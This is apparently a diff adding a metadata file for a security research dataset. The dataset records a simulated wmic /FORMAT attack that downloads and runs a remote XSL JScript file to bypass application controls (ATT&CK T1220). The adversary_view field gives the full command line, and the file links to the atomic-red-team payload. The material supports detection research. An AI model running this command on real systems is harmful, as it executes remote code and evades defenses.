@@ -1,0 +1,31 @@
+title: WMIC Remote XSL Jscript Execution
+id: SDWIN-201017061100
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/17
+modification_date: 2020/10/17
+platform: Windows
+tags:
+description: This dataset represents adversaries proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (jscript).
+attack_mappings:
+  - technique: T1220
+    sub-technique:
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/wmic_remote_xsl_jscript.zip
+simulation:
+  environment: Mordor shire
+  tools:
+    - type: Manual
+      name: ART
+      module: powershell
+      script: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+references:
+  - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1220/T1220.md#atomic-test-4---wmic-bypass-using-remote-xsl-file
+  - https://twitter.com/dez_/status/986614411711442944
